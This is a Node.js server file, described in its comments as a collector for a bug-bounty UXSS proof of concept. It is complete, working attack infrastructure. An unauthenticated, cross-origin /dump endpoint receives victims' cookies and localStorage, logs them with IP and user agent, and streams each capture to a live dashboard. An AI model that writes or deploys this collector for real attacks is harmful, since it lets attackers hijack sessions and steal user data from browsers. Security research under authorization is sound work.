// server.js — out-of-band (OOB) callback collector
//
// Part of an authorized Klarna bug-bounty engagement (HackerOne H1).
// This is the self-hosted equivalent of an Interactsh / Burp Collaborator
// listener: it receives the verification callback fired by the UXSS PoC,
// appends it to a flat text log, and serves a live view of what arrived.
//
// Zero external dependencies — Node.js built-ins only, so there is nothing
// to `npm install` and the container image stays tiny.
//
// Endpoints:
//   GET|POST /dump   collector the PoC calls: /dump?c=<cookies>&l=<localStorage>
//   GET      /stream live HTML dashboard (history + realtime, with timestamps)
//   GET      /stream/sse  Server-Sent Events feed the dashboard subscribes to
//   GET      /raw    the plain .txt log, exactly as stored
//   GET      /health health check for Coolify

'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL, URLSearchParams } = require('url');

const PORT = process.env.PORT || 3000;
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
const LOG_FILE = path.join(DATA_DIR, 'captures.txt');
const MAX_BODY = 1 * 1024 * 1024;              // 1 MB cap per POST body
const MAX_HEADER = 128 * 1024;                 // allow long /dump?... URLs
const BASIC_AUTH = process.env.BASIC_AUTH || ''; // "user:pass" protects the viewer only

// Make sure the storage directory exists before the first write.
fs.mkdirSync(DATA_DIR, { recursive: true });

// --- live subscribers (Server-Sent Events) --------------------------------
const clients = new Set();

function broadcast(record) {
  const frame = 'data: ' + JSON.stringify(record) + '\n\n';
  for (const res of clients) {
    try { res.write(frame); } catch (_) { /* ignore broken pipe */ }
  }
}

// --- persistence: one human-readable block per callback -------------------
function persist(record) {
  const block =
    '===== ' + record.time + ' =====\n' +
    'from:   ' + record.ip + '\n' +
    'method: ' + record.method + '\n' +
    'url:    ' + record.url + '\n' +
    'ua:     ' + record.ua + '\n' +
    'cookies:\n' + indent(record.cookies) + '\n' +
    'localStorage:\n' + indent(record.localStorage) + '\n' +
    (record.raw ? 'raw:\n' + indent(record.raw) + '\n' : '') +
    '\n';
  fs.appendFile(LOG_FILE, block, (err) => {
    if (err) console.error('append failed:', err.message);
  });
}

function indent(s) {
  if (s === undefined || s === null || s === '') return '  (none)';
  return String(s).split('\n').map((l) => '  ' + l).join('\n');
}

// Values arrive already percent-decoded from URLSearchParams; just re-pretty
// the JSON if we can, otherwise store the string verbatim (e.g. if truncated).
function prettyJSON(s) {
  if (!s) return '';
  try { return JSON.stringify(JSON.parse(s), null, 2); } catch (_) { return s; }
}

// --- collect a callback ----------------------------------------------------
function collect(req, res, query, body) {
  let c = query.get('c');
  let l = query.get('l');
  let raw = '';

  if (body) {
    // Accept a JSON body or a form-encoded body as well as query params.
    try {
      const j = JSON.parse(body);
      c = c || j.c || j.cookies || null;
      l = l || j.l || j.localStorage || null;
    } catch (_) {
      const form = new URLSearchParams(body);
      c = c || form.get('c');
      l = l || form.get('l');
      if (!c && !l) raw = body.slice(0, 8192);
    }
  }

  const record = {
    time: new Date().toISOString(),
    ip: (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
      .split(',')[0].trim(),
    method: req.method,
    url: req.url,
    ua: req.headers['user-agent'] || '',
    cookies: prettyJSON(c),
    localStorage: prettyJSON(l),
    raw: raw,
  };

  persist(record);
  broadcast(record);
  console.log('[capture] ' + record.time + ' ' + record.method + ' from ' + record.ip);

  res.writeHead(200, {
    'content-type': 'text/plain; charset=utf-8',
    'access-control-allow-origin': '*',
  });
  res.end('ok\n');
}

// --- Server-Sent Events feed ----------------------------------------------
function sse(req, res) {
  res.writeHead(200, {
    'content-type': 'text/event-stream',
    'cache-control': 'no-cache',
    'connection': 'keep-alive',
    'x-accel-buffering': 'no',
    'access-control-allow-origin': '*',
  });
  res.write('retry: 3000\n\n');
  res.write(': connected\n\n');
  clients.add(res);

  const keepAlive = setInterval(() => {
    try { res.write(': keep-alive\n\n'); } catch (_) { /* ignore */ }
  }, 25000);

  req.on('close', () => {
    clearInterval(keepAlive);
    clients.delete(res);
  });
}

// --- optional basic auth on the viewer (never on /dump) --------------------
function authed(req) {
  if (!BASIC_AUTH) return true;
  const m = /^Basic\s+(.+)$/i.exec(req.headers['authorization'] || '');
  if (!m) return false;
  let decoded = '';
  try { decoded = Buffer.from(m[1], 'base64').toString('utf8'); } catch (_) { /* */ }
  return decoded === BASIC_AUTH;
}

function denyAuth(res) {
  res.writeHead(401, {
    'www-authenticate': 'Basic realm="poc-collector"',
    'content-type': 'text/plain',
  });
  res.end('authentication required\n');
}

// --- router ----------------------------------------------------------------
const server = http.createServer({ maxHeaderSize: MAX_HEADER }, (req, res) => {
  const u = new URL(req.url, 'http://' + (req.headers.host || 'localhost'));
  const route = u.pathname.replace(/\/+$/, '') || '/';

  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'access-control-allow-origin': '*',
      'access-control-allow-methods': 'GET,POST,OPTIONS',
      'access-control-allow-headers': '*',
    });
    return res.end();
  }

  if (route === '/health') {
    res.writeHead(200, { 'content-type': 'text/plain' });
    return res.end('ok');
  }

  // Collector — always open, the PoC must reach it unauthenticated.
  if (route === '/dump' || route === '/collect') {
    if (req.method === 'POST') {
      let body = '';
      let size = 0;
      req.on('data', (chunk) => {
        size += chunk.length;
        if (size > MAX_BODY) { req.destroy(); return; }
        body += chunk;
      });
      req.on('end', () => collect(req, res, u.searchParams, body));
      return;
    }
    return collect(req, res, u.searchParams, '');
  }

  // Everything below is the viewer — gate it behind basic auth if configured.
  if (!authed(req)) return denyAuth(res);

  if (route === '/stream/sse') return sse(req, res);

  if (route === '/raw') {
    fs.readFile(LOG_FILE, 'utf8', (err, data) => {
      res.writeHead(200, { 'content-type': 'text/plain; charset=utf-8' });
      res.end(err ? '(no captures yet)\n' : data);
    });
    return;
  }

  if (route === '/stream' || route === '/') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    return res.end(VIEWER_HTML);
  }

  res.writeHead(404, { 'content-type': 'text/plain' });
  res.end('not found\n');
});

server.listen(PORT, () => {
  console.log('PoC collector listening on :' + PORT);
  console.log('  collector : /dump?c=<cookies>&l=<localStorage>');
  console.log('  live view : /stream');
  console.log('  raw log   : /raw');
  console.log('  log file  : ' + LOG_FILE);
  if (BASIC_AUTH) console.log('  viewer is protected by basic auth');
});

// --- live dashboard --------------------------------------------------------
const VIEWER_HTML = `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PoC Collector — live</title>
<style>
  :root { color-scheme: dark; }
  body { font: 13px/1.5 ui-monospace, Menlo, Consolas, monospace; background:#0d1117; color:#e6edf3; margin:0; }
  header { position:sticky; top:0; background:#161b22; border-bottom:1px solid #30363d; padding:10px 16px; display:flex; align-items:center; gap:12px; z-index:5; }
  header h1 { font-size:14px; margin:0; font-weight:700; }
  #status { font-size:12px; padding:2px 8px; border-radius:10px; background:#30363d; }
  #status.on { background:#1f6f3f; } #status.off { background:#8b2a2a; }
  .muted { color:#8b949e; font-size:12px; }
  main { padding:16px; }
  h2 { font-size:12px; text-transform:uppercase; letter-spacing:.06em; color:#8b949e; margin:22px 0 8px; }
  .card { background:#161b22; border:1px solid #30363d; border-left:3px solid #c31f31; border-radius:6px; padding:10px 12px; margin:8px 0; }
  .card .meta { color:#8b949e; font-size:12px; margin-bottom:6px; }
  .k { color:#d29922; }
  pre { white-space:pre-wrap; word-break:break-word; margin:4px 0 0; }
  #history { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:12px; max-height:60vh; overflow:auto; }
</style>
</head>
<body>
<header>
  <h1>PoC Collector</h1>
  <span id="status" class="off">disconnected</span>
  <span class="muted" id="count"></span>
</header>
<main>
  <h2>Live (this session)</h2>
  <div id="live"><div class="muted">waiting for callbacks…</div></div>
  <h2>Full log — /raw</h2>
  <pre id="history" class="muted">loading…</pre>
</main>
<script>
  var live = document.getElementById('live');
  var statusEl = document.getElementById('status');
  var count = document.getElementById('count');
  var n = 0;
  function esc(s){ return String(s==null?'':s).replace(/[&<>]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;'}[c];}); }
  function card(r){
    if (n === 0) live.innerHTML = '';
    n++; count.textContent = n + ' this session';
    var el = document.createElement('div');
    el.className = 'card';
    el.innerHTML =
      '<div class="meta">' + esc(r.time) + ' &middot; ' + esc(r.ip) + ' &middot; ' + esc(r.method) + ' ' + esc(r.url) + '</div>' +
      '<div><span class="k">cookies:</span><pre>' + esc(r.cookies || '(none)') + '</pre></div>' +
      '<div><span class="k">localStorage:</span><pre>' + esc(r.localStorage || '(none)') + '</pre></div>' +
      (r.raw ? '<div><span class="k">raw:</span><pre>' + esc(r.raw) + '</pre></div>' : '');
    live.insertBefore(el, live.firstChild);
  }
  fetch('/raw').then(function(r){return r.text();}).then(function(t){
    var h = document.getElementById('history');
    h.className = ''; h.textContent = (t && t.trim()) ? t : '(no captures yet)';
  }).catch(function(){});
  (function connect(){
    var es = new EventSource('/stream/sse');
    es.onopen = function(){ statusEl.textContent = 'connected'; statusEl.className = 'on'; };
    es.onmessage = function(e){ try { card(JSON.parse(e.data)); } catch(_){} };
    es.onerror = function(){ statusEl.textContent = 'reconnecting…'; statusEl.className = 'off'; };
  })();
</script>
</body>
</html>`;
